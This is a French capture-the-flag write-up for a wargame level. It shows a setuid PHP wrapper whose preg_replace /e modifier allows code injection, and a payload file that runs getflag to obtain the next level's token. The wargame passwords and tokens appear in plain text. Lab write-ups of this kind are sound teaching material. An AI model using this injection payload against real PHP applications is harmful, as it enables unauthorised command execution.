# Level06: Exploit execution

> login:password -> *`level06:viuaaale9huek52boumoomioc`*
```
:~$ su level06
Password:viuaaale9huek52boumoomioc
```
---

```
:~$ pwd
/home/user/level06
```

```
:~$ ls -la
...
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
...
```

Le Home contient un binaire ainsi qu'un script php:

```
:~$ cat level.php (ici j'ai indenté le code pour mieux le comprendre)
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

./level06 test
PHP Warning:  file_get_contents(test): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

```

On remarque que le binaire veux exécuter le fichier envoyé en paramètre. On va donc créer un script qu'il pourra alors éxécuter

```
:~$ echo '[x ${`getflag`}]' > /tmp/flag06

:~$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```

Le flag nous permet de se connecter au level07
`level07:wiok45aaoguiboiki2tuin6ub`